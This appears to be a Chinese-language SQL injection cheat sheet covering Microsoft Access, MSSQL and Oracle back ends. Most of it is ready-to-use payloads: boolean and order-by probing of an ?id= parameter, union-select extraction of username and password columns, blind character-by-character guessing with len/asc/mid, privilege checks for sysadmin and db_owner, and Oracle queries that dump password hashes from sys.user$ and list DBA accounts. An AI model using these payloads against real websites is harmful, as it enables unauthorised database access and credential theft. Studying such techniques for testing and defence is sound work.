Access注入（特殊）

####Access数据结构

​ 表名

​ 列名

注意：1、Access数据库只有一个数据库；

​ 2、 Access数据库只能靠暴力猜解；

​ 3、 一般Access数据库与ASP网站一起搭建；

​ 4、 Access没有数据库名，没有版本号，统统都没有；

​ 5、 注入的时候无需查询什么版本等等。

​ 6、 access无注释符

注入方法：

1、联合查询法

2、逐字猜解法（常用）

联合注入：

第一步：判断注入点

?id=1 and 1=1返回正常
?id=1 and 1=2返回错误’
存在注入点。

第二步：判断列的字段数

?id=1 order by 3返回正常
?id=1 order by 4返回错误
字段数为3

第三步：猜解表名（判断回显点）

?id=1 union select 1,2,3 from 表名

第四步：猜解列名

?id=1 union select 1,列名一,列名二 from 表名
猜出列名则会返回数据
把上面得到的那两个数字中替换成表中的用户名与密码字段名：
例：username 和 password

第五步：爆出数据

?id=1 union select 1,admin,password from 表名
回显点2爆出用户名，回显点3爆出密码

#####逐字猜解法：（适用于 order by 不能用的地方）

第一步：判断注入点

?id=1' 单引号注入
?id=1 and 1=1 数字型注入

第二步：判断字段数

?id=1 order by 3返回正常
?id=1 order by 4返回错误
字段数为3

第三步：猜表名

?id=1 and exists (select * from admin) ——猜表名

第四步：猜列名

?id=1 and exists (select username/password from admin) ——猜列名

第五步：猜字段中数据长度（1.确定长度 2.确定asc数据）

?id=1 and (select top 1 len(username ) from admin)>5  --判断长度
?id=1 and (select top 1 asc(mid(username ,1,1)) from admin(表名))=97 判断字段第一位(后几位依次类推)

top（附属查询）：

例：top 1 用来返回第一行的内容（也可以用来限制返回内容的行数）

MSSQL(SQL Server)注入

常用框架组合方法ASP+MSSQL

1、判断数据库类型

and exists (select * from sysobjects)--返回正常为mssql（也名sql server）
and exists (select count(*) from sysobjects)--有时上面那个语句不行就试试这个
（sysobjects：MSSQL数据库特有的数据表，系统对象表）
（Exists()：子语句查询，Exists方法返回一个布尔值，该布尔值指示在 Dictionary 对象中是否存在指定的 key，如果存在，返回 true，否则返回 false）

2、判断当前数据库

select db_name(N)  表示当前数据库，其中的参数表示第N个数据库，从0开始

3、查看所有数据库

SELECT top 1 Name FROM Master..SysDatabases  在系统数据库中能够查询所有的数据库
（Master系统数据库）

4、注入点权限判断（根据页面显示效果）

1 select is_srvrolemember('sysadmin');判断当前是否为sa
2 select is_srvrolemember('db_owner');判断当前用户写文件、读文件的权限（db_owner）
3 select is_srvrolemember('public');  判断是否有public权限，可以爆破表

5、查看数据库版本

select @@version

6、查询表名

select top 1 name from test.sys.all_objects where type='U' AND is_ms_shipped=0  获取第一个表名

7、查询列名

select top 1 COLUMN_NAME from test.information_schema.columns where TABLE_NAME='users'

8、获取字段数据

select top 1 username from users
select top 1 password from users

Oracle注入

引导：

dual表，此表是Oracle数据库中的一个自带表，有说法这是一个虚拟表，也有的说是一个实表，它实际上位满足查询条件而产生

与MySQL不同的是，在MySQL中查询语句可以直接是：select 1,2，但是在Oracle中就必须跟一个表名，如下：select * from dual

涉及到的基本用法：

select * from all_tables 查询出所有的表

select * from user_tables 查询出当前用户的表

select * from all_tab_columns 查询出所有的字段

select * from user_tab_columns  查询出当前用户的字段

select * from v$version 查版本

rownum=1   (限制查询返回的总行数为一条)

对于rownum来说它是oracle系统顺序分配为从查询返回的行的编号，返回的第一行分配的是1，第二行是2，依此类推，这个伪字段可以用于限制查询返回的总行数。

注入语句：

（Oracle 字符串区分大小写）

获取数据库版本：

SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
SELECT version FROM v$instance;

获取数据库系统版本：

SELECT banner FROM v$version where banner like 'TNS%';

获取当前数据库用户：

SELECT user FROM dual;
select SYS_CONTEXT('USERENV','CURRENT_USER') from dual

获取当前用户权限：

SELECT * FROM session_privs;

获取所有数据库用户密码：

select name, password, spare4 from sys.user$

获取DB文件路径：

SELECT name FROM V$DATAFILE;

列出DBA账户：

SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’

服务器监听IP：

select utl_inaddr.get_host_address from dual

获取当前操作系统：

SELECT  dbms_utility.port_string FROM dual;
select member from v$logfile where rownum=1  //路径也是可以判断的

获取服务器SID：

select instance_name from v$instance

列出数据库：

SELECT DISTINCT owner FROM all_tables; — 列出数据库 (一个用户一个)

联合注入语句：

（Oracle区分大小写）

判断字段：

order by
union select null,'null' 根据'' 判断哪里是字符串

爆表:

union select 1,(select table_name from user_tables where rownum=1) from dual

union select 1,(select table_name from user_tables where rownum=1 and table_name not in ('第一个表')) from dual

爆字段:

union select 1,(select column_name from user_tab_columns where rownum=1 and table_name='表名（大写的）') from dual

union select 1,(select column_name from user_tab_columns where rownum=1 and table_name='表名' and column_name not in ('第一个字段')) from dual

爆数据:

union select 1,字段1||字段2...||字段n from 表名 where rownum=1 --
连接多个字段用到的连接符号是||,在oracle数据库中，concat函数只能连接两个字符串

通过字段名查找对应的表：

SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%USERNAME%'
